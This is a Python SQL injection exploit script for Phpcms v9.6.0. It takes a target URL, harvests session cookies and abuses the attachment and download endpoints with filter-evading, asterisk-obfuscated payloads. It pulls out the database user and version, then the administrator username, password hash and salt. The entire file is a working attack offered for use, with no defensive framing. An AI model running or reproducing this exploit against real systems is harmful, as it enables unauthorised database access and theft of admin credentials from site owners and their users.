# -*- coding: utf-8 -*-
import requests
import sys
import urllib.parse

url = sys.argv[1]
print('Phpcms v9.6.0 SQLi Exploit Code By Luan')

sqli_prefix = "%*27an*d%20"
sqli_info = "e*xp(~(se*lect%*2af*rom(se*lect co*ncat(0x6c75616e24,us*er(),0x3a,ver*sion(),0x6c75616e24))x))"
sqli_password1 = "e*xp(~(se*lect%*2afro*m(sel*ect co*ncat(0x6c75616e24,username,0x3a,password,0x3a,encrypt,0x6c75616e24) fr*om "
sqli_password2 = "_admin li*mit 0,1)x))"
sqli_padding = "%23%26m%3D1%26f%3Dwobushou%26modelid%3D2%26catid%3D6"

# Step 1: Get cookies
setp1 = url + '/index.php?m=wap&a=index&siteid=1'
cookies = {}
for c in requests.get(setp1).cookies:
    if c.name[-7:] == '_siteid':
        cookie_head = c.name[:6]
        cookies[cookie_head + '_userid'] = c.value
        cookies[c.name] = c.value

print('[+] Get Cookie : ' + str(cookies))

# Step 2: First SQLi - Get current user and MySQL version
sqli_encoded_info = urllib.parse.quote_plus(sqli_info, safe='qwertyuiopasdfghjklzxcvbnm*')
setp2 = url + '/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id=' + sqli_prefix + sqli_encoded_info + sqli_padding
sqli_payload = ""

for c in requests.get(setp2, cookies=cookies).cookies:
    if c.name[-9:] == '_att_json':
        sqli_payload = c.value

print('[+] Get SQLi Payload : ' + sqli_payload)

# Step 3: Get SQLi Output
setp3 = url + '/index.php?m=content&c=down&a_k=' + sqli_payload
html = requests.get(setp3, cookies=cookies).text
print('[+] Get SQLi Output : ' + html.split('luan$')[1])

# Step 4: Extract table prefix
table_prefix = html[html.find('_download_data') - 2:html.find('_download_data')]
print('[+] Get Table Prefix : ' + table_prefix)

# Step 5: Second SQLi - Get admin username & password
encoded_pw1 = urllib.parse.quote_plus(sqli_password1, safe='qwertyuiopasdfghjklzxcvbnm*')
encoded_pw2 = urllib.parse.quote_plus(sqli_password2, safe='qwertyuiopasdfghjklzxcvbnm*')
setp2 = url + '/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id=' + sqli_prefix + encoded_pw1 + table_prefix + encoded_pw2 + sqli_padding

for c in requests.get(setp2, cookies=cookies).cookies:
    if c.name[-9:] == '_att_json':
        sqli_payload = c.value

print('[+] Get SQLi Payload : ' + sqli_payload)

# Step 6: Get SQLi Output
setp3 = url + '/index.php?m=content&c=down&a_k=' + sqli_payload
html = requests.get(setp3, cookies=cookies).text
print('[+] Get SQLi Output : ' + html.split('luan$')[1])
